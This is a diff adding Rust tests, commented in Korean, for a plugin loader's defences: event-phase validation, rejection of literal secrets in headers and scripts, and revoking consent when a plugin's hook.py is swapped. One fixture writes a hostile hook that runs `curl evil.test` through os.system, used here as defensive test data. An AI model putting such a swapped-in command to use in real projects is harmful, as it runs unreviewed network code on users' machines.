@@ -197,6 +197,34 @@ fn empty_subscription_is_rejected() {
     assert!(validate(&d).is_err());
 }
 
+/// DEV-381: **없는 phase 도 적재 때 걸린다.** 오타 난 이름은 잡으면서
+/// `pre:quest.created` 는 통과시켰는데, 그건 아무 오류 없이 영원히 안 도는
+/// 구독이었다 — 이 저장소가 제일 싫어하는 조용한 실패다.
+#[test]
+fn subscribing_to_a_phase_that_never_fires_is_caught_at_load() {
+    let mut d = def(Action::Post {
+        url: "https://x.test".into(),
+        headers: Default::default(),
+        timeout_ms: None,
+    });
+    // 이름은 맞지만 이 이벤트는 pre 를 안 낸다.
+    d.on = vec!["pre:quest.created".into()];
+    let e = validate(&d).unwrap_err().to_string();
+    assert!(e.contains("pre"), "{e}");
+
+    // 실제로 pre 를 내는 것은 통과한다.
+    d.on = vec!["pre:comment.added".into(), "pre:quest.deleted".into()];
+    assert!(validate(&d).is_ok());
+    // 와일드카드는 하나라도 맞으면 통과한다.
+    d.on = vec!["pre:*".into()];
+    assert!(validate(&d).is_ok());
+    d.on = vec!["pre:comment.*".into()];
+    assert!(validate(&d).is_ok());
+    // 아무것과도 안 맞는 pre 와일드카드는 막는다.
+    d.on = vec!["pre:campaign.*".into()];
+    assert!(validate(&d).is_err());
+}
+
 /// 오타 난 이벤트 이름은 **조용히 안 도는** 대신 적재 때 걸린다.
 #[test]
 fn unknown_event_name_is_caught_at_load() {
@@ -389,6 +417,88 @@ fn trust_can_be_withdrawn() {
         1,
         "신뢰 해제가 개별 동의까지 지웠다"
     );
+
+    unsafe { std::env::remove_var("OPENGUILD_HOME") };
+    let _ = std::fs::remove_dir_all(&g);
+    let _ = std::fs::remove_dir_all(&home);
+}
+
+/// **짧은 비밀번호도 비밀이다.** 예전엔 길이 검사가 `any` 안에 있어서, 나머지가
+/// 8자 이하면 `any` 가 통째로 false 가 되고 리터럴이 "환경변수 참조" 로 통과했다.
+#[test]
+fn a_short_literal_in_a_secret_field_is_still_rejected() {
+    for bad in ["Pa55word", "s3cr3t", "abc123", "hunter2"] {
+        let e = validate(&post_with_header("Authorization", bad));
+        assert!(e.is_err(), "짧다고 통과했다: {bad}");
+    }
+    // 참조는 그대로 통과한다.
+    assert!(validate(&post_with_header("Authorization", "Bearer ${TOK}")).is_ok());
+    assert!(validate(&post_with_header("X-Api-Key", "${K}")).is_ok());
+    // 구두점뿐인 값은 비밀이 아니다.
+    assert!(validate(&post_with_header("Authorization", "  ")).is_ok());
+}
+
+/// **스크립트도 git 으로 간다.** `plugin.json` 의 리터럴은 막으면서 `.rhai`
+/// 안의 리터럴을 통과시키면 앞뒤가 안 맞는다 — 게다가 본문은 환경변수 확장을
+/// 안 거치므로 스크립트에 박는 것이 토큰을 싣는 유일한 길이었다.
+#[test]
+fn a_secret_in_the_script_blocks_the_plugin() {
+    let _guard = env_lock();
+    let home = fresh_tmp("scriptsecret-home");
+    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
+    let g = fresh_tmp("scriptsecret");
+    write_plugin(&g, "ai-notify", with_script(&["cli"], "t.rhai"));
+    write_script(
+        &g,
+        "ai-notify",
+        "t.rhai",
+        r#"fn payload(e) { #{ token: "xoxb-1234567890abcdef" } }"#,
+    );
+    consent::trust_guild(&g).unwrap();
+
+    let l = load_for(&g, Scope::Cli);
+    assert!(l.active.is_empty(), "스크립트 안의 토큰이 통과했다");
+    assert_eq!(l.errors.len(), 1);
+    assert!(l.errors[0].1.contains("비밀값"), "{:?}", l.errors);
+
+    unsafe { std::env::remove_var("OPENGUILD_HOME") };
+    let _ = std::fs::remove_dir_all(&g);
+    let _ = std::fs::remove_dir_all(&home);
+}
+
+/// **`run` 이 부르는 옆 파일도 동의 대상이다.** 폴더가 작업 디렉터리이므로
+/// `hook.py` 는 git 으로 따라오는 실행되는 코드다 — 갈아끼우면 다시 물어야 한다.
+#[test]
+fn swapping_a_sibling_program_revokes_consent() {
+    let _guard = env_lock();
+    let home = fresh_tmp("sibling-home");
+    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
+    let g = fresh_tmp("sibling");
+    write_plugin(
+        &g,
+        "notify",
+        json!({
+            "name": "notify",
+            "on": ["quest.created"],
+            "scope": ["cli"],
+            "action": { "run": { "command": "python3", "args": ["hook.py"] } }
+        }),
+    );
+    let hook = plugins_dir(&g).join("notify/hook.py");
+    std::fs::write(&hook, "print('hello')\n").unwrap();
+
+    let l = load_for(&g, Scope::Cli);
+    consent::grant(&g, &l.needs_consent[0]).unwrap();
+    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);
+
+    // 정의는 그대로. 실행되는 코드만 바뀐다.
+    std::fs::write(&hook, "import os; os.system('curl evil.test')\n").unwrap();
+    let after = load_for(&g, Scope::Cli);
+    assert!(
+        after.active.is_empty(),
+        "옆 프로그램이 바뀌었는데 그대로 돌았다"
+    );
+    assert_eq!(after.needs_consent.len(), 1);
 
     unsafe { std::env::remove_var("OPENGUILD_HOME") };
     let _ = std::fs::remove_dir_all(&g);
